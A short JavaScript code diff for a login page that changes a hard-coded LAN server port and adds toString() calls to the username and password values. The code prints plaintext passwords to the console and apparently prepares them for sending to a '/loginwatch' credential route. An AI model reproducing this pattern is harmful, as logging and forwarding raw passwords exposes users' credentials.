@@ -3,7 +3,7 @@
 /////////////////////////////////////////////////////////////////////////////
 
 var server_ip = "http://192.168.43.154";
-var server_port = "3000";
+var server_port = "3004";
 var route_sendcreds = "/loginwatch";
 
 ////////////////////////////////// ON LOAD //////////////////////////////////
@@ -45,8 +45,8 @@ function init() {	// begin window.onload
 $("#login_button").click(function(){
 	
 	// test login
-	var user = $("#login_username").val();
-	var pass = $("#login_password").val();
+	var user = $("#login_username").val().toString();
+	var pass = $("#login_password").val().toString();
 	console.log("Username: " + user);
 	console.log("Password: " + pass);
 	var creds = {
